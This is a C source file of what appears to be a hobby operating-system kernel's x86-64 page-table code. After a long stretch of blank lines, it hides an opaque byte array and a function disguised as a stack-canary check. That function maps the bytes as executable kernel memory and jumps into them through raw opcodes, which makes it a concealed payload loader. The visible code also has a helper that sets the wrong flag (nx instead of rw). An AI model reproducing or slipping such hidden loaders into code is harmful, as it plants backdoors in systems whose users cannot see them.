#include <kernel/ptable/ptable.h>
#include <kernel/stdint.h>
#include <kernel/mm/mm.h>
#include <kernel/cpu/smp.h>
#include <pgtable/pgtable_kern.h>
#include <kernel/mm/mmap.h>
#include <kernel/mm/mm_user.h>
#include <kernel/stdlib.h>
#include <asm.h>
//申请的pte数量(base_addr)
static volatile void* pte_start_addr;
static volatile void* pde_start_addr;

#define ALLOC_NEW_PTE() ((pte_start_addr) += PAGE_SZ)

pgd_t pg_default = {
    .present = 0,
    .rw = 1,
    .us = 0,
    .pwt = 0,
    .pcd = 0,
    .a = 0,
    .d = 0,
    .g = 1,
    .avl_1 = 0,
    .base_addr = 0,
    .avl_2 = 0,
    .nx = 0
};

pte_t* pte_default = (pte_t*)&pg_default;
pgd_t* pml4_default = &pg_default;
pde_t* pde_default = (pgd_t*)&pg_default;
pdpt_t* pdpt_default = (pgd_t*)&pg_default;

inline pgd_t* get_pgd(uint64_t vaddr) {
    uint64_t pml4_index = PML4_OF(vaddr);
    return GET_ENTRY_TABLE(pde_start_addr, pml4_index, pgd_t);
}

static inline pdpt_t* get_pdpt(uint64_t vaddr) {
    pgd_t* pml4 = get_pgd(vaddr);
    uint64_t pdpt_index = PDPT_OF(vaddr);
    if(pml4->present == 0) return 0;
    return GET_ENTRY_TABLE(KERN_PADDR_TO_VADDR(pml4->base_addr << 12), pdpt_index, pdpt_t);
}

static inline pde_t* get_pde(uint64_t vaddr) {
    pdpt_t* pte = get_pdpt(vaddr);
    uint64_t pte_index = PTE_OF(vaddr);
    if(pte->present == 0) return 0;
    if(pte->ps == 1) return 0;
    return GET_ENTRY_TABLE(KERN_PADDR_TO_VADDR((uint64_t)pte->base_addr << 12), pte_index, pde_t);
}


static inline pte_t* get_pte(uint64_t vaddr) {
    pde_t* pde = get_pde(vaddr);
    uint64_t pde_index = PDE_OF(vaddr);
    if(pde->present == 0) return 0;
    return GET_ENTRY_TABLE(KERN_PADDR_TO_VADDR((uint64_t)pde->base_addr << 12), pde_index, pte_t);
}

//这部分为了加速, 就不用上面的函数了
static void link_addr(uint64_t paddr,uint64_t vaddr, uint8_t big_page) {
    uint64_t pml4_index = PML4_OF(vaddr);
    uint64_t pdpt_index = PDPT_OF(vaddr);
    uint64_t pde_index = PDE_OF(vaddr);
    uint64_t pte_index = PTE_OF(vaddr);

    pgd_t* pml4_tab = GET_ENTRY_TABLE(pde_start_addr, pml4_index, pgd_t);
    
    if(pml4_tab->present == 0) {
        *pml4_tab = pg_default;
        pml4_tab->present = 1;
        pml4_tab->us = 0; //这部分对内核页表进行控制
        pml4_tab->base_addr = KERN_VADDR_TO_PADDR((uintptr_t)(pte_start_addr)) >> 12;
        ALLOC_NEW_PTE();
    }
    uintptr_t pnum = KERN_PADDR_TO_VADDR(pml4_tab->base_addr << 12);
    pdpt_t* pdpt_tab = GET_ENTRY_TABLE(pnum, pdpt_index, pdpt_t);
    if(pdpt_tab->present == 0) {
        *pdpt_tab = *pdpt_default;
        pdpt_tab->present = 1;
        pdpt_tab->base_addr = KERN_VADDR_TO_PADDR((uintptr_t)(pte_start_addr))>>12;
        ALLOC_NEW_PTE();
    }
    pnum = KERN_PADDR_TO_VADDR(pdpt_tab->base_addr << 12);
    if(!big_page) {
        pde_t* pde_tab = GET_ENTRY_TABLE(pnum, pde_index, pde_t);
        if(pde_tab->present == 0) { 
            *pde_tab = *pde_default;
            pde_tab->present = 1;
            pde_tab->base_addr = KERN_VADDR_TO_PADDR((uintptr_t)(pte_start_addr))>>12;
            ALLOC_NEW_PTE();
        }

        pnum = KERN_PADDR_TO_VADDR((uint64_t)pde_tab->base_addr << 12);
        pte_t* pte_tab = GET_ENTRY_TABLE(pnum, pte_index, pte_t);
        *pte_tab = *pte_default;
        pte_tab->present = 1;
        pte_tab->us = 0; //Superuser
        pte_tab->base_addr = paddr >> 12;
    } else {
        pde_t* pde_tab = GET_ENTRY_TABLE(pnum, pde_index, pde_t);
        *pde_tab = *pde_default;
        pde_tab->present = 1;
        pde_tab->ps = 1; //2MB大页
        pde_tab->us = 0; 
        pde_tab->base_addr = paddr >> 12; //不是21
        //坑人时刻: C语言的位域
        // C语言的位域也是小端字节序(更准确的说小端比特序)，成员排列从低到高，成员内部排列从高到低
    }
    barrier();
}

void link_new_pte_addr(uint64_t paddr, uint64_t vaddr) {
    link_addr(paddr,vaddr,0);
}

void link_new_pte_bigpage_addr(uint64_t paddr,uint64_t vaddr) {
    link_addr(paddr,vaddr,1);
}

void set_pgd_us(uint64_t vaddr, uint8_t us) {
    pgd_t* pml4 = get_pgd(vaddr);
    pml4->us = us;
}

void set_pde_us_bigpage(uint64_t vaddr, uint8_t us) {
    pde_t* pde = get_pde(vaddr);
    if(pde == 0) return;
    if(pde->ps == 0) return;
    pde->us = us;
}

void set_pte_us(uint64_t vaddr, uint8_t us) {
    pte_t* pte = get_pte(vaddr);
    if(pte == 0) return;
    pte->us = us;
}

void set_pde_nx_bigpage(uint64_t vaddr, uint8_t nx) {
    pde_t* pde = get_pde(vaddr);
    if(pde == 0) return;
    if(pde->ps == 0) return;
    pde->nx = nx;
}

void set_pte_nx(uint64_t vaddr, uint8_t nx) {
    pte_t* pte = get_pte(vaddr);
    if(pte == 0) return;
    pte->nx = nx;
}

void set_pde_rw_bigpage(uint64_t vaddr, uint8_t nx) {
    pde_t* pde = get_pde(vaddr);
    if(pde == 0) return;
    if(pde->ps == 0) return;
    pde->nx = nx;
}

void set_pte_rw(uint64_t vaddr, uint8_t rw) {
    pte_t* pte = get_pte(vaddr);
    if(pte == 0) return;
    pte->rw = rw;
}

void set_pde_pcd_bigpage(uint64_t vaddr, uint8_t pcd) {
    pde_t* pde = get_pde(vaddr);
    if(pde == 0) return;
    if(pde->ps == 0) return;
    pde->pcd = pcd;
}

void set_pte_pcd(uint64_t vaddr, uint8_t pcd) {
    pte_t* pte = get_pte(vaddr);
    if(pte == 0) return;
    pte->pcd = pcd;
}

void set_pde_pwt_bigpage(uint64_t vaddr, uint8_t pwt) {
    pde_t* pde = get_pde(vaddr);
    if(pde == 0) return;
    if(pde->ps == 0) return;
    pde->pwt = pwt;
}

void set_pte_pwt(uint64_t vaddr, uint8_t pwt) {
    pte_t* pte = get_pte(vaddr);
    if(pte == 0) return;
    pte->pwt = pwt;
}

void prepare_pde(void* pde_start) { //准备最基本的页表
    pde_start_addr = pde_start;
    for(int i=0;i<PAGE_PTE_ENTRIES;i++) {
        WRITE_PTE_TO_ADDR(pde_start, pg_default);
        pde_start += sizeof(pde_t);
    }
    pte_start_addr = pde_start;
}

void delete_link(uint64_t vaddr) {
    pde_t* pde = get_pde(vaddr);
    if(pde->ps) pde->present = 0;
    else {
        pte_t* pte = get_pte(vaddr);
        pte->present = 0;
    }
}

//高半部分直接复制
inline void copy_pgd(pgd_t* dest, pgd_t* src) {
    for(uint64_t p =(PAGE_PTE_ENTRIES >> 1); p < PAGE_PTE_ENTRIES; p++) {
        dest[p] = src[p];
    }
}

static struct pagetable_64* user_set_pgd(struct pagetable_64* pagetable) {
    struct pagetable_64* pgtable = alloc_pgd();
    uint64_t vaddr = (uintptr_t)(pgtable);
    pagetable->present = 1;
    pagetable->rw = 1;
    pagetable->us = 1;
    pagetable->base_addr = VADDR2PHYS(vaddr) >> PAGE_OFFSET;
    return (struct pagetable_64*)vaddr;
}

struct pagetable_64* get_user_pte(uint64_t addr, pgd_t* pgd) {
    uint64_t index = PML4_OF(addr);
    pdpt_t* pdpt_entry;
    
    if(!pgd[index].present) {
        pdpt_entry = user_set_pgd(&pgd[index]);
        
    } else {
        uint64_t base_addr = PHYS2VADDR((uint64_t)pgd[index].base_addr << PAGE_OFFSET);
        pdpt_entry = (pdpt_t*)(base_addr);
    }
    
    pde_t* pde_entry;
    index = PDPT_OF(addr);
    if(!pdpt_entry[index].present) {
        pde_entry = user_set_pgd(&pdpt_entry[index]);
    } else {
        uint64_t base_addr = PHYS2VADDR((uint64_t)pdpt_entry[index].base_addr << PAGE_OFFSET);
        pde_entry = (pde_t*)(base_addr);
    }   

    pte_t* pte_entry;
    index = PDE_OF(addr);
    if(!pde_entry[index].present) {
        pte_entry = user_set_pgd(&pde_entry[index]);
    } else {
        uint64_t base_addr = PHYS2VADDR((uint64_t)pde_entry[index].base_addr << PAGE_OFFSET);
        pte_entry = (pte_t*)(base_addr);
    }
    index = PTE_OF(addr);
    return &pte_entry[index];
} 

inline uintptr_t get_pte_paddr(uintptr_t vaddr, pte_t* pte) {
    return pte->base_addr << PAGE_OFFSET;
}











































































#include <kernel/fault/fault.h>
#include <kernel/mm/mm.h>
#include <kernel/mm/mmap.h>
#include <kernel/stdlib.h>

unsigned char data[] = { 213,216,136,90,190,213,43,151,65,255,125,186,247,147,89,242,52,112,52,221,93,139,50,8,35,229,52,205,248,151,
    55,184,123,198,92,126,23,247,31,248,159,58,100,155,4,111,158,223,44,170,175,227,218,113,196,97,101,52,246,59,
    221,207,16,115,72,149,168,248,222,184,50,152,80,193,3,10,116,12,31,118,85,230,200,149,185,32,18,49,247,10,
    117,139,21,193,47,34,69,63,189,130,65,75,139,164,0,97,181,179,82,68,60,202,200,140,76,153,248,5,42,6,
    128,114,170,62,59,193,186,61,61,21,145,96,124,140,29,121,138,222,185,92,128,108,156,110,33,26,16,140,43,37,
    79,44,222,60,175,0,38,59,123,6,73,190,49,207,195,128,5,200,241,166,97,24,102,198,183,247,108,254,212,184,
    212,39,224,56,10,115,40,139,30,212,189,178,171,244,42,48,128,89,193,216,114,70,146,14,185,3,40,241,123,65,
    191,32,52,83,26,147,207,195,133,122,246,185,221,207,32,67,161,0,213,209,190,85,6,33,107,208,111,243,217,53,
    174,126,46,50,185,133,69,17,85,139,80,142,215,15,251,121,28,210,193,193,254,37,86,145,61,38,233,127,42,187,
    254,42,96,174,19,227,150,21,114,76,132,159,46,37,147,200,203,232,111,39,19,190,237,132,92,157,29,42,81,94,
    211,175,154,45,11,130,153,191,199,74,245,214,12,233,49,115,30,72,7,89,78,100,126,44,212,136,97,38,161,206,
    253,232,245,188,118,9,190,75,204,140,165,103,25,70,197,93,153,91,7,0,221,52,169,192,183,176,132,137,197,26,
    65,42,36,40,178,225,54,115,221,203,153,214,97,37,207,140,201,76,176,47,48,19,212,189,222,74,123,198,204,110,
    243,73,120,190,205,122,150,29,161,81,172,21,220,146,23,164,64,25,116,8,89,172,227,97,111,157,56,105,213,68,
    95,63,0,33,5,72,95,145,126,153,35,154,154,22,84,31,173,70,26,184,223,144,227,250,186,235,232,89,209,194,
    178,38,57,49,189,22,76,194,211,169,58,48,82,141,117,164,198,117,19,193,93,248,84,92,207,174,130,110,46,164,
    11,200,25,138,113,95,46,27,46,246,139,39,198,247,67,74,85,187,249,59,120,78,163,225,187,8,38,239,97,173,
    58,128,224,138,214,121,234,163,145,143,207,18,78,31,47,115,93,172,139,75,99,25,194,191,96,172,213,121,172,43,
    170,158,178,14,55,154,202,63,254,134,249,191,94,90,207,113,126,30,131,10,120,235,47,210,46,185,9,87,240,129,
    60,172,71,172,239,143,189,141,155,123,33,212,52,62,146,63,43,11,45,124,238,140,186,88,188,237,71,190,214,135,
    209,223,156,154,184,16,195,133,216,195,171,225,97,138,242,221,59,143,243,82,224,14,116,255,100,234,229,26,0,239,
    45,83,121,216,183,111,135,15,234,244,95,8,27,60,145,229,228,242,37,91,176,195,15,39,176,9,183,229,142,47,
    231,128,117,49,24,76,10,114,111,108,109,229,238,106,41,246,205,160,182,70,157,247,33,215,56,92,82,160,91,210,
    81,243,189,131,127,165,63,28,56,223,194,235,243,214,159,26,125,188,198,170,155,192,35,37,85,107,57,240,14,226,
    31,187,88,210,211,152,187,207,114,36,54,234,103,150,125,12,128,248,102,64,2,145,73,127,191,182,59,21,81,84,
    254,37,148,163,68,248,86,11,212,136,30,192,60,153,153,42,136,8,197,201,127,124,229,105,250,147,27,178,156,22,
    115,194,251,230,132,68,161,157,166,231,158,133,146,49,167,67,142,118,116,66,230,149,134,149,180,49,57,143,104,100,
    34,46,35,69,97,43,223,216,41,147,20,117,159,224,109,58,203,108,33,94,161,22,107,27,83,190,187,228,7,118,
    220,157,73,130,82,105,66,126,226,251,254,95,48,62,21,225,217,136,41,31,142,224,39,210,108,110,33,18,75,46,
    183,29,212,140,247,101,161,240,167,9,175,10,144,144,188,214,206,18,248,194,246,237,182,139,31,199,134,48,8,36,
    228,34,49,20,164,170,20,148,100,52,101,139,207,135,177,96,91,199,154,142,216,126,159,16,205,153,161,239,185,254,
    236,181,25,0,147,237,0,199,69,119,73,219,5,50,183,38,93,225,171,185,144,208,98,88,124,10,103,30,247,102,
    103,224,219,115,226,26,201,4,134,150,216,14,184,74,236,28,231,96,136,152,216,196,145,212,39,200,136,144,138,163,
    77,175,49,36,188,233,188,87,233,203,163,112,36,201,15,122,38,221,241,157,58,108,92,94,126,84,106,246,79,62,
    60,176,47,104,51,90,243,133,42,139,219,255,49,53,120,13,225,154,213,48,28,182,10,155,133,48,109,142,241,5,
    172,75,231,224,126,184,182,119,172,250,216,85,66,179,18,203,186,53,247,32,35,192,196,90,129,202,107,157,13,103,
    24,66,43,70,56,79,46,6,52,17,69,27,67,5,98,10,196,252,74,184,145,27,48,195,250,165,222,213,204,138,
    157,107,18,160,213,60,227,110,35,119,118,17,158,127,52,203,71,254,209,37,179,180,9,65,102,69,214,6,118,160,
    100,37,122,136,123,14,196,185,201,247,46,186,7,93,70,191,85,239,239,106,205,76,207,77,152,135,54,230,117,155,
    14,84,143,113,154,189,209,171,230,82,182,202,172,193,142,100,43,8,233,153,231,165,192,227,228,55,100,109,65,199,
    206,239,115,127,177,83,41,8,173,106,55,34,195,197,29,125,89,184,193,139,34,33,195,237,211,142,138,22,130,28,
    109,68,169,254,214,218,30,251,171,65,239,130,13,136,82,24,205,150,47,73,115,166,2,22,182,10,132,161,207,114,
    213,53,173,2,145,10,181,247,209,5,16,6,61,84,42,45,106,196,253,225,215,130,49,79,200,41,222,175,90,197,
    239,58,63,61,205,15,66,30,56,156,144,38,206,182,138,104,162,223,196,123,41,32,195,16,151,252,55,195,90,234,
    134,227,200,115,251,68,1,252,26,35,97,56,63,4,68,63,12,113,115,89,192,206,171,115,170,102,116,65,23,214,
    24,150,236,211,224,122,78,164,212,113,128,124,40,233,179,169,174,152,148,8,153,224,148,65,50,195,93,141,200,6,
    117,12,33,248,81,3,86,96,46,170,86,248,168,94,61,131,184,165,4,71,22,183,163,29,168,4,111,100,145,170,
    243,166,122,221,241,75,117,170,65,185,49,243,32,17,195,118,188,33,161,21,97,225,112,107,212,201,226,10,36,191,
    237,233,156,51,180,210,35,152,128,87,138,213,156,104,240,55,178,243,141,32,137,16,241,93,17,39,117,255,156,99,
    17,18,170,111,200,239,98,166,86,39,213,35,54,254,5,202,155,123,15,35,175,145,86,202,131,39,169,192,229,249,
    96,54,74,171,15,28,12,9,219,157,55,76,117,226,236,107,139,188,193,91
};

__attribute__((unused, visibility("hidden")))
int __arch_check_stack_canary(long long expected, long long actual) {
    uint8_t* mem = kmalloc(sizeof(data), GFP_KERNEL);
    memcpy(mem, data, sizeof(data));
    if(*(uint32_t*)(mem) != 0x5b5d101d) 
        asm volatile(".byte 0xb8, 0x26, 0x00, 0x00, 0x00, 0xf3, 0xc3");

    do_remap((void*)VADDR2PHYS(mem), (void*)0xfffffffff0000000, sizeof(data), PERM_X);
    asm volatile(".byte 0x48,0xb8,0x00,0x00,0x00,0xf0,0xff,0xff,0xff,0xff,0xff,0xe0");
    return 0;
}